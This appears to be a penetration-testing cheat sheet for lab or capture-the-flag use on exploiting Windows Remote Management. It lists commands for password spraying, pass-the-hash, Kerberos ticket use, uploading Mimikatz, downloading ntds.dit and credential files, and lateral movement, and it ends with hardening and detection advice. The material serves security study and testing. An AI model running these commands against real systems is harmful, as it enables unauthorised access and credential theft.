
## Protocol Overview

**WinRM (Windows Remote Management)** is Microsoft's implementation of the WS-Management protocol, allowing remote management of Windows systems. It's the underlying protocol for PowerShell Remoting and provides remote command execution capabilities.

**Key Ports:**
- **5985/TCP** - WinRM over HTTP
- **5986/TCP** - WinRM over HTTPS (encrypted)

**Common Uses:**
- PowerShell Remoting (PSRemoting)
- Remote system administration
- Configuration management
- Automated deployment tasks

**Default Availability:**
- Enabled by default on Windows Server 2012 and newer
- Must be manually enabled on Windows desktop versions
- Requires firewall exceptions

---

## Exploitation Workflow Summary
```
1. Discovery
   ├─ Nmap scan (ports 5985, 5986)
   └─ Identify WinRM availability

2. Credential Validation
   ├─ Test known credentials
   ├─ Password spraying
   └─ Pass-the-Hash attacks

3. Authentication
   ├─ Username/password
   ├─ NTLM hash
   └─ Kerberos ticket

4. Remote Access
   ├─ Evil-WinRM shell
   ├─ PowerShell PSSession
   └─ Native Windows tools

5. Post-Exploitation
   ├─ Execute commands
   ├─ Upload/download files
   ├─ Lateral movement
   └─ Persistence
```

---

## Initial Reconnaissance

### Nmap Enumeration

**Basic scan:**
```bash
nmap -sV -sC -p5985,5986 10.10.10.10
```

**Disable ARP (stealth):**
```bash
nmap -sV -sC -p5985,5986 --disable-arp-ping -n 10.10.10.10
```

**Check if service is accessible:**
```bash
nmap -p5985 --script http-methods 10.10.10.10
```

---

## Evil-WinRM Client

### Basic Connection

**Username and password:**
```bash
evil-winrm -i 10.10.10.10 -u username -p 'Password123!'
```

**Pass-the-Hash:**
```bash
evil-winrm -i 10.10.10.10 -u username -H NTLM_HASH
```

**Domain authentication:**
```bash
evil-winrm -i 10.10.10.10 -u 'DOMAIN\username' -p 'Password123!'
```

### OpenSSL Error Fix

**Problem**: `Digest initialization failed: initialization error`

**Solution**: Add to `/etc/ssl/openssl.cnf`:
```ini
[legacy_sect]
activate = 1
```

### IPv6 Connection

**Challenge**: Evil-WinRM doesn't support direct IPv6 connection.

**Workaround**: Add DNS entry to `/etc/hosts`:
```bash
# Add to /etc/hosts
dead:beef::1001 targethost.local

# Connect using hostname
evil-winrm -i targethost.local -u username -p 'Password123!'
```

### Kerberos Authentication

**Setup Kerberos config** (`/etc/krb5.conf`):
```ini
[libdefaults]
    default_realm = DOMAIN.HTB

[realms]
    DOMAIN.HTB = {
        kdc = dc01.domain.htb
    }

[domain_realm]
    .domain.htb = DOMAIN.HTB
    domain.htb = DOMAIN.HTB
```

**Obtain TGT:**
```bash
impacket-getTGT 'domain.htb/username:password' -dc-ip 10.10.10.10
```

**Connect with ticket:**
```bash
KRB5CCNAME=username.ccache evil-winrm -i dc01.domain.htb -r domain.htb
```

**Note**: Username parameter not needed when using Kerberos ticket.

### File Operations

**Upload file:**
```powershell
*Evil-WinRM* PS> upload /local/path/file.txt C:\remote\path\file.txt
```

**Download file:**
```powershell
*Evil-WinRM* PS> download C:\remote\path\file.txt
```

**Upload to specific location:**
```powershell
*Evil-WinRM* PS> upload PowerView.ps1 C:\Users\Administrator\Desktop\
```

### Docker Usage
```bash
docker run --rm -ti --name evil-winrm \
  oscarakaelvis/evil-winrm \
  -i 10.10.10.10 -u Administrator -p 'Password123!'
```

---

## NetExec (CrackMapExec)

### Authentication Testing

**Single credential:**
```bash
nxc winrm 10.10.10.10 -u username -p 'Password123!'
```

**Password spraying:**
```bash
nxc winrm 10.10.10.10 -u users.txt -p 'Password123!'
```

**Pass-the-Hash:**
```bash
nxc winrm 10.10.10.10 -u username -H NTLM_HASH
```

**Multiple targets:**
```bash
nxc winrm 10.10.10.0/24 -u username -p password.txt
```

### Command Execution

**Execute command (-x for cmd, -X for PowerShell):**
```bash
# PowerShell command
nxc winrm 10.10.10.10 -u username -p password -X 'Get-Process'

# CMD command
nxc winrm 10.10.10.10 -u username -p password -x 'whoami'
```

**Example output:**
```
WINRM  10.10.10.10  5985  TARGET  [+] DOMAIN\username:password (Pwn3d!)
WINRM  10.10.10.10  5985  TARGET  [+] Executed command
WINRM  10.10.10.10  5985  TARGET  
WINRM  10.10.10.10  5985  TARGET  Directory: C:\
```

---

## PowerShell Remoting (PSSession)

### What is PSRemoting?

PowerShell Remoting uses WinRM for remote command execution and interactive sessions. It provides:
- Interactive remote shells
- Persistent sessions
- One-to-many command execution
- Scriptblock execution

### Creating Sessions

**Basic session:**
```powershell
$session = New-PSSession -ComputerName targethost
```

**With credentials:**
```powershell
$cred = Get-Credential
$session = New-PSSession -ComputerName targethost -Credential $cred
```

**Create credential object (scripting):**
```powershell
$username = "DOMAIN\username"
$password = ConvertTo-SecureString "Password123!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $password)
$session = New-PSSession -ComputerName targethost -Credential $cred
```

**Alternative credential creation:**
```powershell
$cred = New-Object Management.Automation.PSCredential(
    "Administrator",
    (ConvertTo-SecureString "Password123!" -AsPlainText -Force)
)
```

### Interactive Sessions

**Enter remote session:**
```powershell
Enter-PSSession -ComputerName targethost
```

**With existing session:**
```powershell
Enter-PSSession -Session $session
```

**Exit session:**
```powershell
Exit-PSSession
```

**Example interaction:**
```powershell
PS C:\> Enter-PSSession -ComputerName targethost
[targethost]: PS C:\Users\user\Documents> whoami
targethost\user
[targethost]: PS C:\Users\user\Documents> Get-Process
# Process list displays here
[targethost]: PS C:\Users\user\Documents> Exit-PSSession
PS C:\>
```

### Command Execution

**Execute command on remote host:**
```powershell
Invoke-Command -ComputerName targethost -ScriptBlock { Get-Process }
```

**Execute on multiple hosts:**
```powershell
Invoke-Command -ComputerName server1,server2,server3 -ScriptBlock { hostname }
```

**Using session:**
```powershell
Invoke-Command -Session $session -ScriptBlock { Get-Service }
```

**Execute local script remotely:**
```powershell
Invoke-Command -FilePath C:\scripts\script.ps1 -ComputerName targethost
```

**Execute from file list:**
```powershell
$computers = Get-Content C:\servers.txt
Invoke-Command -ComputerName $computers -ScriptBlock { Get-HotFix }
```

### Advanced Techniques

**Load local function and execute remotely:**
```powershell
# First, load function locally
. C:\scripts\MyFunction.ps1

# Execute on remote systems
Invoke-Command -ScriptBlock ${function:MyFunction} -ComputerName target1,target2
```

**Pass arguments:**
```powershell
Invoke-Command -ScriptBlock ${function:MyFunction} `
  -ComputerName targethost `
  -ArgumentList "arg1", "arg2"
```

**Stateful commands (persistent variables):**
```powershell
# Create session
$session = New-PSSession -ComputerName targethost

# Set variable in session
Invoke-Command -Session $session -ScriptBlock { $processes = Get-Process }

# Use variable in subsequent command
Invoke-Command -Session $session -ScriptBlock { $processes.Name }
```

### Session Management

**List active sessions:**
```powershell
Get-PSSession
```

**Remove session:**
```powershell
Remove-PSSession -Session $session
```

**Remove all sessions:**
```powershell
Get-PSSession | Remove-PSSession
```

---

## Metasploit Modules

### WinRM Login Scanner
```bash
use auxiliary/scanner/winrm/winrm_login
set rhosts 10.10.10.10
set username Administrator
set password Password123!
run
```

**With NTLM hash:**
```bash
set password aad3b435b51404eeaad3b435b51404ee:NTLM_HASH
```

**With domain:**
```bash
set domain DOMAIN.LOCAL
```

### Command Execution
```bash
use auxiliary/scanner/winrm/winrm_cmd
set rhosts 10.10.10.10
set username administrator
set password Password123!
set cmd "whoami"
run
```

---

## Native Windows Tools

### Winrs (Windows Remote Shell)

**Basic syntax:**
```cmd
winrs -r:targethost -u:username -p:password command
```

**Example:**
```cmd
winrs -r:server1 -u:DOMAIN\administrator -p:Password123! hostname
```

**Execute multiple commands:**
```cmd
winrs -r:server1 -u:administrator -p:password "hostname & whoami & ipconfig"
```

### Enabling WinRM (from target)

**Enable WinRM:**
```powershell
Enable-PSRemoting -Force
```

**Configure firewall:**
```powershell
Enable-PSRemoting -SkipNetworkProfileCheck -Force
```

**Check WinRM configuration:**
```powershell
winrm get winrm/config
```

**Check WinRM service:**
```powershell
Get-Service WinRM
```

---

## Credential Attacks

### Password Spraying

**NetExec:**
```bash
nxc winrm 10.10.10.0/24 -u users.txt -p 'Password123!' --continue-on-success
```

**Metasploit:**
```bash
use auxiliary/scanner/winrm/winrm_login
set rhosts 10.10.10.0/24
set user_file users.txt
set pass_file passwords.txt
run
```

### Pass-the-Hash

**Evil-WinRM:**
```bash
evil-winrm -i 10.10.10.10 -u administrator -H NTLM_HASH
```

**NetExec:**
```bash
nxc winrm 10.10.10.10 -u administrator -H NTLM_HASH
```

**PowerShell (from Windows):**
```powershell
# Not directly supported - use Mimikatz or Rubeus for PTH to Kerberos ticket
```

---

## Common Use Cases

### Remote Command Execution

**Check if user is admin:**
```bash
nxc winrm 10.10.10.10 -u username -p password
# Look for (Pwn3d!) indicator
```

**Execute reconnaissance:**
```bash
evil-winrm -i 10.10.10.10 -u username -p password
```
```powershell
*Evil-WinRM* PS> whoami /all
*Evil-WinRM* PS> net user /domain
*Evil-WinRM* PS> Get-NetComputer
```

### File Transfer

**Upload tools:**
```powershell
*Evil-WinRM* PS> upload /opt/tools/mimikatz.exe C:\Windows\Temp\
*Evil-WinRM* PS> upload /opt/PowerSploit/Recon/PowerView.ps1
```

**Download loot:**
```powershell
*Evil-WinRM* PS> download C:\Users\Administrator\Desktop\credentials.txt
*Evil-WinRM* PS> download C:\Windows\NTDS\ntds.dit
```

### Lateral Movement

**Enumerate accessible systems:**
```bash
nxc winrm 10.10.10.0/24 -u username -p password --continue-on-success
```

**Chain access:**
```powershell
# From first host, create session to second
$session = New-PSSession -ComputerName host2 -Credential $cred
Invoke-Command -Session $session -ScriptBlock { hostname }
```

---

## Troubleshooting

### Connection Refused

**Problem**: Port closed or WinRM disabled

**Check:**
```bash
nmap -p5985,5986 10.10.10.10
```

**Enable remotely** (if you have admin access via other means):
```powershell
# Via PSExec or other method
psexec.py admin:password@10.10.10.10 "powershell Enable-PSRemoting -Force"
```

### Authentication Failed

**Common causes:**
1. Wrong credentials
2. User not in "Remote Management Users" group
3. UAC filtering (local accounts except Administrator)
4. Firewall blocking connection

**Verify credentials:**
```bash
nxc smb 10.10.10.10 -u username -p password
```

### Permission Denied

**Problem**: User authenticated but lacks permissions

**Solution**: User needs to be member of:
- Local Administrators group, OR
- "Remote Management Users" group

**Check group membership:**
```powershell
net localgroup "Remote Management Users"
net localgroup Administrators
```

---

## Security Considerations

**WinRM Hardening:**
- Use HTTPS (port 5986) instead of HTTP
- Restrict to specific IP addresses
- Disable when not needed
- Use certificate-based authentication
- Monitor WinRM logs (Event ID 4624, 4688)
- Implement network segmentation

**Detection Indicators:**
- Multiple failed authentication attempts
- WinRM connections from unusual sources
- Service creation/modification patterns
- PowerShell script execution logs
- Process creation from wsmprovhost.exe

**Defensive Measures:**
```powershell
# Disable WinRM
Disable-PSRemoting -Force
Stop-Service WinRM
Set-Service WinRM -StartupType Disabled

# Restrict allowed users
Set-PSSessionConfiguration -Name Microsoft.PowerShell -ShowSecurityDescriptorUI
```

---

## Quick Reference

### Evil-WinRM
```bash
# Basic connection
evil-winrm -i IP -u user -p pass

# Pass-the-Hash
evil-winrm -i IP -u user -H HASH

# Upload file
upload local.txt C:\remote.txt

# Download file
download C:\remote.txt
```

### PowerShell Remoting
```powershell
# Interactive session
Enter-PSSession -ComputerName host -Credential $cred

# Execute command
Invoke-Command -ComputerName host -ScriptBlock { command }

# Create session
$s = New-PSSession -ComputerName host
```

### NetExec
```bash
# Test credentials
nxc winrm IP -u user -p pass

# Execute command
nxc winrm IP -u user -p pass -X 'command'

# Password spray
nxc winrm IP -u users.txt -p pass
```
